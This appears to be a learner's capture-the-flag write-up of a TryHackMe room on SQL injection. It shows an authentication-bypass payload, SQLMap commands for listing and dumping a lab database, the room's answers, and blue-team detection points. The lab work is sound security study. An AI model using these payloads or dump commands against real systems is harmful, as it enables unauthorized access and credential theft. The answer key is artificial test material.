# TryHackMe Room: SQLMap — The Basics

**Path:** Offensive Security Tooling  
**Module Type:** Hands-on (Web Exploitation)  
**Difficulty:** Beginner  
**Status:** Completed  

---

# Summary

This room introduces **SQL Injection** and demonstrates how to exploit it using **SQLMap**, an automated tool.

It explains:
- How web apps interact with databases  
- How SQL Injection works  
- How attackers bypass authentication  
- How SQLMap automates exploitation  

---

# Rooms in This Module

| Order | Section | Primary Focus | Status |
|------|--------|--------------|--------|
| 1 | Introduction | Databases & SQL basics | ✔ |
| 2 | SQL Injection | Manual exploitation | ✔ |
| 3 | SQLMap Tooling | Automation | ✔ |
| 4 | Practical | Real exploitation | ✔ |

---

# Key Concepts Covered

- Database interaction (DBMS)  
- SQL query structure  
- Input validation failures  
- Authentication bypass  
- SQL Injection techniques  
- Automated exploitation (SQLMap)  
- Data extraction (DB → Tables → Records)  

---

# Room Notes & Task Breakdown

---

## Task 1: Introduction

**Room Objective:**  
Understand how websites interact with databases.

---

### Q1: Language used between web app and database?

`sql`

**Explanation:**  
Structured Query Language (SQL) is used to interact with databases.

---

### Key Learning

- Websites store user data in databases  
- SQL queries retrieve and validate data  
- Login systems depend on SQL queries  

---

### Example Query

SELECT * FROM users WHERE username='John' AND password='password';

---

### Insight

> Authentication = database query validation

---

### Common Struggles

- Not understanding backend flow  
- Treating login as frontend-only  

---

## Task 2: SQL Injection Vulnerability

**Room Objective:**  
Understand how SQL Injection works.

---

### Vulnerable Query

SELECT * FROM users WHERE username='John' AND password='abc';

---

### Injection Example

Password:

abc' OR 1=1;-- -

---

### Resulting Query

SELECT * FROM users WHERE username='John' AND password='abc' OR 1=1;-- -

---

### Q1: Boolean operator allowing one true condition?

`or`

**Explanation:**  
OR makes query true if any condition is true.

---

### Q2: Is 1=1 always true?

`YEA`

**Explanation:**  
Logical condition always evaluates to true.

---

### Key Learning

- Improper input validation → vulnerability  
- OR 1=1 bypasses authentication  
- -- comments out remaining query  

---

### Insight

> SQL Injection = manipulating query logic

---

### Common Struggles

- Not understanding query structure  
- Missing role of `'` (quote breaking)  
- Confusing AND vs OR behavior  

---

## Task 3: SQLMap (Automated Exploitation)

**Room Objective:**  
Use SQLMap to automate SQL Injection.

---

### What is SQLMap?

- Tool to:
  - Detect SQL injection  
  - Exploit vulnerabilities  
  - Extract database data  

---

### Basic Scan

sqlmap -u http://target.com/page?id=1

---

### Q1: Flag to extract databases?

`--dbs`

**Explanation:**  
Lists all available databases.

---

### Q2: Command to extract tables from "members"?

`sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

**Explanation:**  
-D specifies database, --tables lists tables.

---

### Important Flags

| Flag | Purpose |
|------|--------|
| -u | Target URL |
| --dbs | List databases |
| -D | Select database |
| --tables | List tables |
| -T | Select table |
| --dump | Dump data |

---

### Workflow

1. Detect injection  
2. Extract databases  
3. Extract tables  
4. Dump records  

---

### Insight

> SQLMap turns manual exploitation → automated workflow :contentReference[oaicite:0]{index=0}  

---

### Common Struggles

- Not identifying vulnerable parameters  
- Wrong URL format  
- Not increasing scan depth (--level=5)  

---

## Task 4: Practical Exploitation

**Room Objective:**  
Exploit real vulnerable application.

---

### Target

http://MACHINE_IP/ai/login

---

### Extracted URL

http://MACHINE_IP/ai/includes/user_login?email=test&password=test

---

### Key Findings

---

### Q1: Number of databases?

`6`

**Explanation:**  
Enumerated using --dbs.

---

### Q2: Table in "ai" database?

`user`

**Explanation:**  
Extracted using -D ai --tables.

---

### Q3: Password of test@chatai.com?

`12345678`

**Explanation:**  
Dumped using -T user --dump.

---

### Insight

> Full compromise path:
GET param → SQLi → DB dump → credentials

---

### Common Struggles

- Not capturing GET request properly  
- Skipping browser network inspection  
- Ignoring SQLMap prompts  

---

# Tools Used

- SQLMap  
- Browser DevTools (Network tab)  
- Web application (vulnerable target)  

---

# Commands Cheat Sheet

Basic scan

sqlmap -u <url>

List databases

sqlmap -u <url> --dbs

List tables

sqlmap -u <url> -D <db> --tables

Dump data

sqlmap -u <url> -D <db> -T <table> --dump

Advanced scan

sqlmap -u <url> --level=5

POST request testing

sqlmap -r request.txt

---

# Reflection

This module connects:

> **Web input → Database → Data compromise**

Key takeaways:

- SQL Injection is **logic manipulation**  
- Input validation is critical  
- SQLMap simplifies exploitation  
- Data extraction follows a structured workflow  

---

### From a Blue Team / SOC POV

- Suspicious query patterns (OR 1=1)  
- Unexpected database dumps  
- High-frequency automated requests  
- Unusual parameter manipulation
